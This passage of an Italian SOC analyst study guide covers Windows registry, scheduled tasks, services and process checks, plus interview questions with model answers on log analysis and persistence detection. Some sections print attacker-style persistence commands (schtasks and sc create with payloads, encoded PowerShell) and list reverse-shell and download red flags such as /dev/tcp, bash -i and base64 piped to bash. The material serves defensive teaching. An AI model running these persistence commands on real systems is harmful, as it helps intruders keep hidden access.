HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

#### Ispezione del Registry

**Con `regedit` (GUI):**
- Aprire: `Win + R` → `regedit`
- Navigare tra le chiavi come un file manager
- Cercare: `Ctrl + F` per cercare valori specifici

**Con `reg query` (riga di comando):**

```cmd
:: Controllare le chiavi Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Controllare i servizi
reg query HKLM\SYSTEM\CurrentControlSet\Services

:: Cercare un valore specifico
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "NomeSospetto"

:: Esportare una chiave per analisi offline
reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run C:\output\run_key.reg
```

**Con PowerShell:**

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Cercare in modo ricorsivo
Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Recurse
```

---

### ⏰ Task Scheduler di Windows

Il Task Scheduler permette di pianificare l'esecuzione automatica di programmi. È uno dei **metodi più comuni di persistenza malware** su Windows.

#### Come funziona

- I task possono essere attivati da: orario, login utente, avvio sistema, evento specifico
- Ogni task ha: trigger (quando), azione (cosa fare), condizioni, impostazioni
- I task sono salvati in: `C:\Windows\System32\Tasks\`

#### Abuso per Persistenza

```cmd
:: Un attaccante potrebbe creare un task come questo:
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru SYSTEM

:: Task che esegue PowerShell encoded (molto sospetto)
schtasks /create /tn "Maintenance" /tr "powershell -e SQBFAFgAKABOAGUAdwA..." /sc daily /st 02:00
```

#### Verifica Task Sospetti

```cmd
:: Elencare tutti i task schedulati
schtasks /query /fo LIST /v

:: Cercare task specifici
schtasks /query | findstr /i "suspicious"
```

```powershell
# PowerShell — più dettagliato
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} |
    ForEach-Object {
        $info = $_ | Get-ScheduledTaskInfo
        [PSCustomObject]@{
            Name = $_.TaskName
            Path = $_.TaskPath
            Action = ($_.Actions | ForEach-Object {$_.Execute})
            LastRun = $info.LastRunTime
            NextRun = $info.NextRunTime
        }
    } | Format-Table -AutoSize
```

#### Event ID Correlati

| Event ID | Log | Descrizione |
|----------|-----|-------------|
| **4698** | Security | Task schedulato creato |
| **4699** | Security | Task schedulato eliminato |
| **4700** | Security | Task schedulato abilitato |
| **4701** | Security | Task schedulato disabilitato |
| **4702** | Security | Task schedulato aggiornato |
| **106** | Task Scheduler | Task registrato |
| **200** | Task Scheduler | Azione eseguita |
| **201** | Task Scheduler | Azione completata |

---

### ⚙️ Servizi Windows

Un servizio Windows è un programma che gira in background, spesso con privilegi elevati (SYSTEM). I servizi vengono avviati automaticamente all'avvio del sistema.

#### Come verificare i servizi

```cmd
:: CMD
sc query
sc query state= all
sc qc "NomeServizio"          :: Configurazione dettagliata di un servizio
net start                     :: Lista servizi in esecuzione
```

```powershell
# PowerShell
Get-Service | Where-Object {$_.Status -eq "Running"} | Format-Table -AutoSize
Get-Service | Where-Object {$_.DisplayName -like "*suspicious*"}

# Dettagli completi di un servizio
Get-WmiObject win32_service | Where-Object {$_.Name -eq "NomeServizio"} |
    Select-Object Name, DisplayName, PathName, StartMode, State, StartName
```

#### Abuso per Persistenza

```cmd
:: Creare un servizio malevolo
sc create "WindowsDefenderUpdate" binPath= "C:\Users\Public\malware.exe" start= auto

:: Modificare un servizio esistente
sc config "LegitService" binPath= "C:\payload.exe"
```

#### Red Flags nei Servizi

| Indicatore | Perché è sospetto |
|------------|--------------------|
| Servizio con path in `C:\Users\`, `C:\Temp\`, `C:\ProgramData\` | I servizi legittimi stanno in `C:\Windows\` o `C:\Program Files\` |
| Servizio che esegue `cmd.exe` o `powershell.exe` | I servizi legittimi usano un proprio eseguibile |
| Nome generico (WindowsUpdate, SystemService) | Tentativo di mimetizzarsi |
| Account di esecuzione `LocalSystem` per servizi non Microsoft | Accesso troppo privilegiato per software di terze parti |
| Servizio senza descrizione | I servizi legittimi hanno una descrizione |

---

### 🔄 Processi Windows Legittimi

Conoscere i processi legittimi di Windows è **cruciale** per un SOC Analyst. Il malware spesso si maschera usando nomi simili ai processi di sistema (es. `svch0st.exe` invece di `svchost.exe`).

| Processo | Descrizione | Path Legittimo | Parent Process | Istanze Normali | 🚩 Red Flag |
|----------|-------------|----------------|----------------|-----------------|-------------|
| **System** | Kernel di Windows | N/A | Nessuno (PID 4) | 1 | PID diverso da 4, path definito |
| **smss.exe** | Session Manager Subsystem | `C:\Windows\System32\` | System (PID 4) | 1 | Più di 1 istanza, parent diverso da System, path sbagliato |
| **csrss.exe** | Client/Server Runtime | `C:\Windows\System32\` | Creato da smss.exe (parent non visibile) | 2+ (una per sessione) | Path diverso da System32, una sola istanza |
| **wininit.exe** | Inizializzazione Windows | `C:\Windows\System32\` | Creato da smss.exe | 1 | Più di 1 istanza, parent visibile, path sbagliato |
| **winlogon.exe** | Gestione login Windows | `C:\Windows\System32\` | Creato da smss.exe | 1+ (una per sessione) | Parent visibile diverso da smss, path sbagliato |
| **services.exe** | Service Control Manager | `C:\Windows\System32\` | wininit.exe | 1 | Più di 1 istanza, parent diverso, path sbagliato |
| **lsass.exe** | Local Security Authority | `C:\Windows\System32\` | wininit.exe | 1 | ⚠️ Più di 1 istanza è quasi certamente malevola (mimikatz/credential dumping). Path sbagliato, parent diverso |
| **svchost.exe** | Service Host | `C:\Windows\System32\` | services.exe | Molte (10+) | Parent diverso da services.exe, path sbagliato (es. `C:\Windows\svchost.exe`), nome leggermente diverso (`svch0st.exe`) |
| **explorer.exe** | Shell grafica (desktop) | `C:\Windows\` | userinit.exe (parent termina) | 1 per utente loggato | Più istanze del previsto, parent sospetto, path sbagliato |

#### Come verificare i processi

```powershell
# Verificare il path di tutti i processi svchost
Get-Process svchost | Select-Object Id, ProcessName, Path | Format-Table -AutoSize

# Verificare il parent process
Get-CimInstance Win32_Process |
    Select-Object ProcessId, Name, ParentProcessId, ExecutablePath |
    Format-Table -AutoSize

# Cercare processi con nomi simili ma path diversi (mascheramento!)
Get-Process | Where-Object {
    $_.Path -ne $null -and
    $_.Name -match "svchost|csrss|lsass|services|explorer" -and
    $_.Path -notmatch "C:\\Windows"
} | Select-Object Name, Id, Path
```

> **SOC Tip:** Il mascheramento di processi (process masquerading, MITRE ATT&CK T1036) è una tecnica comunissima. Controlla SEMPRE il path completo e il parent process. Un `svchost.exe` che gira da `C:\Users\` o con parent diverso da `services.exe` è quasi certamente malware.

---

## 🎯 Domande da Colloquio — Sistemi Operativi per SOC

### Domanda 1: Come identifichi un tentativo di brute-force SSH su Linux?

**Risposta modello:**

Per identificare un brute-force SSH su Linux, analizzo il file `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS). Cerco pattern ricorrenti di "Failed password":

```bash
grep "Failed password" /var/log/auth.log | tail -50
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10
```

Segnali di brute-force: molti tentativi falliti dallo stesso IP in breve tempo, tentativi con username diversi (password spraying), IP provenienti da geolocalizzazioni anomale. Verifico anche se un login è poi riuscito con `grep "Accepted password"` per capire se l'attacco ha avuto successo. Correlo con l'Event ID 4625 su Windows se è un ambiente misto.

---

### Domanda 2: Quali sono i file SUID e perché sono importanti per la sicurezza?

**Risposta modello:**

Un file con bit SUID (Set User ID) viene eseguito con i permessi del proprietario del file, non dell'utente che lo lancia. Se un file SUID è di proprietà di root, chiunque lo esegua avrà temporaneamente i privilegi di root.

Questo è un meccanismo legittimo (ad esempio `/usr/bin/passwd` ha SUID perché deve modificare `/etc/shadow`), ma può essere sfruttato per privilege escalation se applicato a binari non previsti (come `find`, `vim`, `python`).

Per trovarli: `find / -perm -4000 -type f 2>/dev/null`. Confronto la lista con i SUID noti e legittimi del sistema. Un file SUID in `/tmp` o `/home` è quasi certamente malevolo.

---

### Domanda 3: Come verifichi se un processo `svchost.exe` è legittimo su Windows?

**Risposta modello:**

Verifico tre aspetti chiave:
1. **Path**: deve essere `C:\Windows\System32\svchost.exe`. Qualsiasi altro percorso (es. `C:\Windows\svchost.exe` o `C:\Users\...\svchost.exe`) è un red flag.
2. **Parent Process**: deve essere `services.exe` (PID di services.exe). Un parent diverso è anomalo.
3. **Nome**: attenzione a varianti come `svch0st.exe`, `svchost.exe` (con spazi), `scvhost.exe`.

```powershell
Get-CimInstance Win32_Process -Filter "Name='svchost.exe'" |
    Select-Object ProcessId, ParentProcessId, ExecutablePath
```

Ogni istanza di svchost.exe legittima ospita uno o più servizi Windows (verificabili con `tasklist /svc`). Un svchost.exe senza servizi associati è sospetto.

---

### Domanda 4: Cosa indica l'Event ID 1102 nel Security log di Windows?

**Risposta modello:**

L'Event ID 1102 indica che **il log Security è stato cancellato**. Questo è uno degli eventi più critici per un SOC Analyst perché:

1. È quasi sempre un segno di attività malevola — un attaccante che tenta di eliminare le tracce
2. L'evento stesso non può essere cancellato (viene generato nel momento in cui il log viene pulito)
3. Contiene informazioni su chi ha eseguito la cancellazione (utente e SID)

In un SIEM, questo evento dovrebbe avere una regola di alert ad **alta priorità**. La risposta dovrebbe includere: isolamento della macchina, analisi forense, verifica di altri log (System, Application, Sysmon) che potrebbero non essere stati cancellati.

---

### Domanda 5: Come usi la pipeline Linux per analizzare i log di un web server?

**Risposta modello:**

La pipeline è fondamentale per analisi rapide. Esempio concreto per trovare i top IP attaccanti:

```bash
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

Per trovare tentativi di SQL injection:
```bash
grep -iE "(union|select|drop|insert|update|delete|;|--)" /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

Per analizzare le risposte 404 (possibile directory enumeration):
```bash
awk '$9 == 404 {print $1, $7}' access.log | sort | uniq -c | sort -rn | head -20
```

Ogni passaggio della pipeline ha uno scopo preciso: estrazione dati → ordinamento → conteggio → ordinamento per frequenza → visualizzazione dei risultati top.

---

### Domanda 6: Quali chiavi di registro controlleresti per cercare persistenza malware?

**Risposta modello:**

Le chiavi principali da controllare sono:

1. **Run/RunOnce** (esecuzione all'avvio):
   - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
   - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
   - RunOnce per entrambi

2. **Services** (servizi malevoli):
   - `HKLM\SYSTEM\CurrentControlSet\Services`

3. **Winlogon** (hook nel processo di login):
   - `HKLM\...\Winlogon` → chiavi Shell e Userinit

4. **Image File Execution Options** (debugger hijacking):
   - `HKLM\...\Image File Execution Options`

Con PowerShell:
```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Confronto ogni voce con una baseline nota del sistema. Voci con path in `C:\Users\`, `C:\Temp\`, o con nomi base64/randomici sono sospette.

---

### Domanda 7: Come monitori le connessioni di rete su un host compromesso (Linux e Windows)?

**Risposta modello:**

**Su Linux:**
```bash
ss -tulnp                           # Tutte le porte in ascolto con processo
netstat -tulnp                      # Alternativa
lsof -i -P -n                       # File e connessioni aperte
ss -tnp state established           # Solo connessioni stabilite
```

**Su Windows:**
```cmd
netstat -ano                         # Connessioni con PID
```
```powershell
Get-NetTCPConnection -State Established |
    Select-Object RemoteAddress, RemotePort, OwningProcess
```

In entrambi i casi, cerco: connessioni verso IP esterni non noti, porte non standard (4444, 1337, 8080), connessioni stabilite da processi che non dovrebbero averne (notepad.exe, calc.exe), traffico DNS anomalo (possibile C2 via DNS tunneling).

---

### Domanda 8: Cosa sono i log `auth.log` e perché sono importanti?

**Risposta modello:**

`/var/log/auth.log` (su Debian/Ubuntu, equivalente a `/var/log/secure` su RHEL/CentOS) è il log che registra tutti gli eventi di autenticazione e autorizzazione:

- Login SSH riusciti e falliti
- Comandi `sudo` eseguiti
- Cambi di utente con `su`
- Attività PAM (Pluggable Authentication Modules)
- Modifica di utenti e gruppi

È il **primo file da analizzare** durante un incidente su Linux perché permette di ricostruire chi ha fatto cosa e quando. Lo analizzo con:

```bash
# Login falliti (brute-force detection)
grep "Failed password" /var/log/auth.log
# Login riusciti
grep "Accepted" /var/log/auth.log
# Comandi sudo (privilege escalation)
grep "sudo:" /var/log/auth.log
# Nuovi utenti creati
grep "useradd" /var/log/auth.log
```

---

### Domanda 9: Come riconosci un cron job malevolo?

**Risposta modello:**

Controllo tutti i crontab del sistema:

```bash
# Crontab di ogni utente
for user in $(cut -d: -f1 /etc/passwd); do echo "=== $user ==="; crontab -l -u $user 2>/dev/null; done

# File cron di sistema
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
```

**Red flags:**
- Comandi con `wget`, `curl`, `bash -i`, `/dev/tcp` → download e reverse shell
- Codifica base64 (`echo "..." | base64 -d | bash`) → offuscamento
- Path in `/tmp`, `/dev/shm`, o directory nascoste (`.hidden/`)
- Esecuzione ogni minuto (`* * * * *`) → beacon C2
- File eseguiti senza path assoluto chiaro
- Crontab per utenti di servizio (www-data, nobody) che normalmente non ne hanno

---

### Domanda 10: Quali Event ID di Windows monitoreresti con priorità alta nel SIEM?

**Risposta modello:**

Configurerei le seguenti regole SIEM con priorità decrescente:

| Priorità | Event ID | Descrizione | Perché |
|----------|----------|-------------|--------|
| 🔴 Critica | 1102 | Log cancellati | Distruzione di evidenze |
| 🔴 Critica | 4720 | Account creato | Backdoor account |
| 🟠 Alta | 4625 (molti) | Login falliti multipli | Brute-force |
| 🟠 Alta | 7045 | Nuovo servizio | Persistenza |
| 🟠 Alta | 4698 | Task schedulato creato | Persistenza |
| 🟡 Media | 4688 | Processo creato | Execution tracking |
| 🟡 Media | 4672 | Privilegi speciali | Privilege escalation |
| 🟡 Media | 4648 | Login con cred. esplicite | Lateral movement |

Correlo sempre gli eventi: ad esempio, un 4625 massivo seguito da un 4624 + 4672 indica un brute-force riuscito con privilegi elevati — scenario critico.

---

### Domanda 11: Come verifichi se un account utente è stato compromesso su Windows?

**Risposta modello:**

Seguo un approccio sistematico:

1. **Controlla il Security log per l'utente:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Where-Object {$_.Message -like "*username*"} |
    Select-Object TimeCreated, Message -First 20
```

2. **Cerca login da IP/orari anomali** — confronto con il pattern normale dell'utente

3. **Verifica sessioni attive:**
```cmd
query user
query session
```

4. **Controlla i processi lanciati dall'utente:**
```powershell
Get-CimInstance Win32_Process |
    Where-Object {$_.GetOwner().User -eq "username"} |
    Select-Object Name, ProcessId, CommandLine
```

5. **Verifica eventuali task schedulati creati dall'utente**

6. **Controlla se sono stati assegnati privilegi speciali (4672)**

7. **Cerca lateral movement** — login su altri host con le stesse credenziali (4624 Logon Type 3 o 10)

---

### Domanda 12: Qual è la differenza tra `/proc` e i log in `/var/log` per l'analisi forense?

**Risposta modello:**

`/proc` e `/var/log` forniscono informazioni complementari ma fondamentalmente diverse:

**`/proc`** è un file system virtuale che rappresenta lo **stato corrente** del sistema in memoria:
- `/proc/[PID]/cmdline` — riga di comando con cui è stato lanciato un processo
- `/proc/[PID]/exe` — link al binario eseguibile
- `/proc/[PID]/fd/` — file descriptor aperti
- `/proc/[PID]/maps` — mappatura della memoria
- `/proc/net/tcp` — connessioni TCP attive

**`/var/log`** contiene i **log storici** del sistema scritti su disco.

La differenza chiave: `/proc` mostra cosa sta succedendo **adesso** (volatile — si perde al reboot), mentre `/var/log` mostra cosa è successo **nel tempo** (persistente). In un'analisi forense, `/proc` è cruciale per la risposta live (analisi di processi malevoli in esecuzione), mentre `/var/log` è fondamentale per la ricostruzione della timeline. Un attaccante può cancellare i log ma non può nascondere facilmente un processo da `/proc` (a meno di rootkit kernel).

---

### Domanda 13: Spiega come un attaccante potrebbe ottenere persistenza sia su Linux che su Windows.

**Risposta modello:**

**Su Linux, i metodi principali sono:**

1. **Cron job**: aggiunta di una reverse shell in crontab
2. **SSH authorized_keys**: aggiunta della propria chiave pubblica in `~/.ssh/authorized_keys`
3. **Servizi systemd**: creazione di un servizio custom in `/etc/systemd/system/`
4. **Modifica `.bashrc`/`.profile`**: esecuzione di codice al login dell'utente
5. **File SUID**: creazione di una copia SUID di `/bin/bash`
6. **Init scripts**: aggiunta di comandi in `/etc/rc.local`

**Su Windows, i metodi principali sono:**

1. **Chiavi di registro Run/RunOnce**: esecuzione automatica al login
2. **Task schedulati**: creazione di task con trigger all'avvio o periodico
3. **Servizi**: registrazione come servizio Windows
4. **Startup folder**: inserimento di shortcut in `shell:startup`
5. **WMI Event Subscription**: sottoscrizione a eventi WMI per trigger
6. **DLL hijacking**: sostituzione di DLL legittime con versioni malevole

Per ogni metodo, conosco dove cercare e quali comandi usare per rilevarlo. La combinazione di più metodi di persistenza è comune in attacchi avanzati (APT).

---

### Domanda 14: Come usi `tcpdump` per catturare traffico sospetto durante un incidente?

**Risposta modello:**

Durante un incidente, uso `tcpdump` con filtri mirati per non sovraccaricare lo storage:

```bash
# Catturare TUTTO il traffico e salvarlo per Wireshark
sudo tcpdump -i eth0 -w /tmp/incident_$(date +%Y%m%d_%H%M%S).pcap

# Catturare solo il traffico verso l'IP del C2 identificato
sudo tcpdump -i eth0 host 203.0.113.50 -w c2_traffic.pcap

# Catturare traffico DNS (rilevamento DNS tunneling)
sudo tcpdump -i eth0 port 53 -w dns_traffic.pcap

# Catturare traffico su porte associate a reverse shell
sudo tcpdump -i eth0 'port 4444 or port 5555 or port 8080' -w suspicious_ports.pcap

# Catturare solo pacchetti SYN per rilevare port scan in corso
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'

# Catturare traffico tra due host (possibile lateral movement)
sudo tcpdump -i eth0 'host 192.168.1.10 and host 192.168.1.20'
```

Salvo sempre in formato PCAP per analisi successiva con Wireshark. Limito la cattura nel tempo o nel numero di pacchetti in produzione per non riempire il disco. In parallelo, uso `tshark` per analisi in tempo reale.

---

> 📚 **Nota finale:** La padronanza dei sistemi operativi si acquisisce con la **pratica costante**. Installa una VM Linux (Ubuntu/Kali) e una Windows Server, genera log realistici e analizzali. La familiarità con la riga di comando è ciò che distingue un SOC Analyst competente.
